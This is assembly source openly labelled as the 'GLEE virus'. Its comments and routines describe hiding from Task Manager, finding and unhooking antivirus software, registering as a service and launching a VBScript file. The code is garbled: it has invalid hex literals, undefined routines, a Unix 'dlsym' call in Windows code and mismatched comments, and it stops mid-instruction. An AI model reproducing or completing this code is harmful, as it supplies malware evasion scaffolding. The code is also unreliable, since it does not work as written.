;
; GLEE virus
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.586p
.model flat, stdcall


; Kode5's INCLUDEs (Windows directory)
include    \masm\include\winapi\windows.inc
include    \masm\include\winapi\kernel32.inc

includemacro \masm\include\winapi\windows.inc
includemacro \masm\include\winapi\kernel32.inc


; Useful equates
MAX_PATH                    equ     260
GEEM_BA                     equ     4
KERNEL_                         equ     <"KERNEL32.DLL">
VBS                          equ     <".\geeme.vbs">

@DEBUG                        equ     TRUE
IF @DEBUG
EXTRN   GetModuleHandleA:PROC ; Needed when debugging
ELSE
EXTRN   MessageBoxA:PROC      ; Not needed when debugging
ENDIF


.data

vbs_file_name               db      MAX_PATH            dup (?)
exe_file_name               db      MAX_PATH            dup (?)
copy_of_exe                 db      MAX_PATH            dup (?)
virus_name                  db      "glee.com",0
virus_author                db      "MrSandman",0
virus_size                  dd      offset end_virus-1000h
our_handle                  dd      ?                   ; Our HMODULE
vbs_create_time             dd      9 dup (?)           ; Unused
vbs_access_mask             dd      80000000h           ; FILE_GENERIC_READ
vbs_share_mode              dd      1fh                 ; SH_DENYWR
vbs_file_attributes         dd      30h                 ; NORMAL & ARCHIVE
vbs_creation_disposition    dd      3                   ; OPEN_EXISTING
vbs_open_file_handle        dd      ?
vbs_allocation_granularity  dd      9 dup (?)           ; Unused
vbs_fs_attribute            dd      9 dup (?)           ; Unused
vbs_maximum_component_length dd     9 dup (?)          ; Unused
vbs_fs_drive_type           dd      9 dup (?)          ; Unused
vbs_root_dir                db      MAX_PATH            dup (?)
vbs_full_path               db      MAX_PATH            dup (?)


.code

start:
    push    0
    call    GetModuleHandleA                            ; Needed when debugging

    lea     eax, [this_code]                            ; Put entry point
    push    eax                                         ; Add to command line

    lea     eax, [cmd_line]                             ; Push command line
    push    eax

    mov     eax, 0bff70000h                            ; Exit code
    push    eax

    lea     eax, [hwnd]                                 ; Push window handle
    push    eax

    invoke  CreateProcess, KERNEL_, vbs, 0, 0, FALSE, 0, 0, 0, 
            vbs_create_time, vbs_process_information

    invoke  CloseHandle, vbs_open_file_handle

if DEBUG
    lea     eax, [db2]
    push    eax
    xor     eax, eax
    push    eax
    call    MessageBoxA
endif

exit:

this_code:                                              ; Our code begins here
    call    delta                                       ; Fix our delta offset
    lea     esi, [esi + _delta]

    push    eax                                         ; Save exit code

    mov     eax, [_kernel_base]                         ; Push our kernel base
    push    eax

    mov     byte ptr ds:[eax+128], 0                    ; Null the IDT

    pop     eax                                         ; Get our kernel base
    mov     [ebp - 4], eax                              ; And save it

    mov     edi, [esp]                                  ; Get the address of
                                                        ; the stack based SP

do_relocation:
    add     edi, [_reloc_delta]                         ; Calculate relocation
    mov     eax, dword ptr [edi][relocation]            ; address
    mov     edx, dword ptr [edi][relocation_delta]      ;
    cmp     eax, 0bffffff00h                           ; Is it below this?
    jae     do_not_relocate                             ; If so, dont relocate
    lea     ebx, [_kernel_base]                         ; Otherwise calculate
    sub     eax, ebx                                    ; all addresses used.
    sub     edx, ebx

    jmp     do_relocation                               ; Jump back for next

do_not_relocate:                                        ;

    mov     dword ptr [ebp + kernel_address], eax       ; Save kernel adress

    call    hide_from_task_manager                    ;

    call    get_antivirus_names                       ;
    call    get_antivirus_addresses                   ;

    lea     eax, [ebx][virus_name]                     ;
    push    eax                                       ;
                                                        ;
    lea     eax, [ebx][virus_author]                   ;
    push    eax                                       ;
                                                        ;
    push    virus_size                                  ;

    mov     eax, [_vss_process_handle]                 ;
    test    eax, eax                                   ;
    je      no_service_tag_set                         ;
set_service_tag:                                        ;
    push    eax                                        ;
                                                        ;
    push    offset service_tag                          ;
                                                        ;
no_service_tag_set:                                     ;
    call    RegisterServiceProcess                      ;

    lea     eax, [ebx][service_main_function]          ;
    push    eax
    push    0ffffffffh
    call    StartServiceCtrlDispatcher

    xor     eax, eax                                  ; Zero everything
    mov     ecx, end_virus - _vss_process_name          ;
    lea     esi, [_vss_process_name]                    ;
    mov     edi, esi                                    ;
loop_zeroing:                                           ;
    stosb                                                ;
    loop    loop_zeroing                                ;

    mov     [ebp + bytes_left], 0                     ; Reset memory hook counter
                                                        ;
hook_a_byte:                                            ;
    mov     al, byte ptr [edi]                         ;
    cmp     al, 0eahdch                                 ;
    jb      check_hooked_already                        ;
    cmp     al, 0ffh                                    ;
    jne     hook_a_byte                                  ;
check_hooked_already:                                   ;
    rol     al, cl                                      ;
    cmp     al, byte ptr [edi]                          ;
    jz      find_next_byte_to_hook                      ;
    mov     byte ptr [edi], al                          ;
    inc     [ebp + bytes_left]                          ;
find_next_byte:                                          :
    inc     edi                                         ;
    cmp     edi, [ebp + start_hook_at]                  ;
    ja      hook_a_byte                                  ;
    jl      quit_hooking                                ;
quit_hooking:                                           ;
    movzx   ecx, byte ptr [ebp + bytes_left]            ;
    sub     ecx, 1                                     ;
    or      ecx, ecx                                   ;
    jz      unhook_all_anti                    ; Nothing to unhook? Unhook them
                                                   ;
    jmp     hook_a_byte                           ; Not finished hooking?
                                                   ;
unhook_all_anti:                                       ;
    lea     esi, [_vss_anti_names]               ; Put pointer to our names list
    lea     edi, [_vss_anti_addrs]                ; And one to our addresses list
                                                    ;
loop_unhooking:                                          ;
    push    esi                                       ; Set up arguments
    lodsd                                             ; Next anti name/addr
    push    eax                                       ;
    push    edi                                       ;
    call    UnhookAPI                                 ;
                                                    ;
    add     esp, 8                                    ; Clear the stack
    cmp     byte ptr [edi], 0h                      ; Are we at the end?
    jnz     loop_unhooking                            ; No? Lets do it again!

    lea     edi, [ebp][start_hook_at]                ; EDI = where to go now
    xor     eax, eax                                  ;
    xor     ecx, ecx                                  ;
    xor     ebp, ebp                                  ;
    jmp     edd                                   ; Yes! Now leave!

service_main_function:                                  ;
    cmp     [esp + 0cch], SERVICE_RUNNING             ; Check if service status
    jne     service_main_exit                          ; is not running

check_for_services:                                      ;
    push    4                                               ;
    push    1                                               ;
    push    0                                                 ;
    push    0                                               ;
    call    OpenSCManagerA                                  ; 
                                                        ; Open service control
                                                            ; manager
    push    eax                                         ; Save handle
    push    0                                             ;
    push    KERNEL_ "NetServerGetInfo"                   ;
    mov     eax, [_kernel_address]                       ;
    push    eax                                         ;
    call    dlsym                                         ;
    mov     [ebp][_netservergetinfo], eax                ; 
                                                        ; Find NetServerGetInfo
    call    GetLastError                                  ; and put errorcode
    test    eax, eax                                    ; in EAX
    jnz     stop_services_on_error                      ; != 0? Error occured!
                                                        ;
    pushad                                                ; Save registers
    pushfd                                              ; Save flags
    mov     eax, 0                                        ; Set error code
    call    SetLastSystemError                          ;
    popfd                                               ; Restore flags
    popad                                               ; And registers
stop_services_on_error:

    call    close_sc_manager                            ; Close service control

service_main_exit:                                     ;
    and     [esp + 010h], NOT 00000002h                 ; Set ServiceStatus
    push    4                                             ; to STOP_PENDING
    push    00
